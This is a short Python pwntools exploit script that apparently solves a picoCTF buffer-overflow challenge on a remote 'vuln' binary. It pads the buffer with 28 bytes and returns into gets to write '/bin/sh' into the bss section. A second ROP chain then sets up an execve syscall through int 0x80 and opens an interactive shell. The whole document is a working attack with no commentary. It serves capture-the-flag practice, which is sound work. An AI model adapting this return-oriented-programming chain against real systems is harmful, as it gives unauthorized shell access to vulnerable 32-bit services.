from pwn import *

def bytes2str(input):
	return str(input,"utf-8")

elf = ELF("./vuln",checksec=False)
#p = elf.process()
p = remote("saturn.picoctf.net", 56265)

#gdb.attach(p,'''
#	b *0x08049dd0
#	continue
#	''')

gets = elf.sym['gets']
vuln = elf.sym['vuln']
bss_addr = elf.bss() + 64
pop_ecx_ret = 0x08049e39
pop_eax_edx_ebx = 0x080583c8
int_80 = 0x0804a3d2

padding = b'A'*28

payload1 = padding
payload1 += p32(gets)
payload1 += p32(vuln)
payload1 += p32(bss_addr)

p.sendline(payload1)
p.sendline(b"/bin/sh")

payload2 = padding
payload2 += p32(pop_eax_edx_ebx)
payload2 += p32(11)
payload2 += p32(0)
payload2 += p32(bss_addr)
payload2 += p32(pop_ecx_ret)
payload2 += p32(0)
payload2 += p32(int_80)

p.sendline(payload2)
p.interactive()
